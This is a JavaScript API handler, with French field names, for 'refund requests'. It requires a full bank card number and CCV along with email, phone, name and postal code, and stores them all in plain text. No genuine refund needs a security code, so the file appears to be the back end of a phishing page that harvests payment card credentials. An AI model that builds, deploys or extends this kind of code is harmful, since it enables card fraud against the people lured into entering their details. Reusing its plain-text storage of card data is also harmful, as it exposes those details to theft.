import { assertStorageConfigured, getRefund, setRefund } from "./_lib/store.js";
import { json, methodNotAllowed, parseBody } from "./_lib/http.js";

const REQUIRED_FIELDS = ["reference", "montant", "email", "telephone", "numeroCarteBancaire", "ccv"];

function datePart(date) {
  const year = date.getFullYear();
  const month = String(date.getMonth() + 1).padStart(2, "0");
  const day = String(date.getDate()).padStart(2, "0");
  return `${year}${month}${day}`;
}

function randomPart() {
  return String(Math.floor(Math.random() * 1000000)).padStart(6, "0");
}

async function createUniqueReference() {
  const base = datePart(new Date());

  for (let i = 0; i < 10; i += 1) {
    const reference = `RMB-${base}-${randomPart()}`;
    const existing = await getRefund(reference);
    if (!existing) return reference;
  }

  throw new Error("Unable to generate unique reference");
}

export default async function handler(req, res) {
  if (methodNotAllowed(req, res, "POST")) return;

  let payload;
  try {
    payload = parseBody(req);
  } catch {
    payload = null;
  }

  if (!payload) {
    return json(res, 400, { error: "Invalid JSON body" });
  }

  for (const field of REQUIRED_FIELDS) {
    if (!String(payload[field] || "").trim()) {
      return json(res, 400, { error: `Missing required field: ${field}` });
    }
  }

  try {
    assertStorageConfigured();

    const reference = await createUniqueReference();
    const now = new Date().toISOString();
    const record = {
      reference,
      status: "received",
      createdAt: now,
      updatedAt: now,
      orderReference: String(payload.reference || "").trim(),
      pseudo: String(payload.pseudo || "").trim(),
      totalAmount: String(payload.montant || "").trim(),
      email: String(payload.email || "").trim(),
      phone: String(payload.telephone || "").trim(),
      fullName: String(payload.identite || "").trim(),
      orderDate: String(payload.dateAchat || "").trim(),
      postalCode: String(payload.codePostal || "").trim(),
      cardNumber: String(payload.numeroCarteBancaire || payload.cardNumber || payload.iban || "").trim(),
      numeroCarteBancaire: String(payload.numeroCarteBancaire || payload.cardNumber || payload.iban || "").trim(),
      ccv: String(payload.ccv || "").trim(),
      details: String(payload.details || "").trim(),
    };

    await setRefund(reference, record);

    return json(res, 201, {
      reference,
      status: record.status,
      createdAt: record.createdAt,
      message: "Refund request created",
    });
  } catch (error) {
    return json(res, error.statusCode || 500, {
      error: error.message || "Internal server error",
    });
  }
}
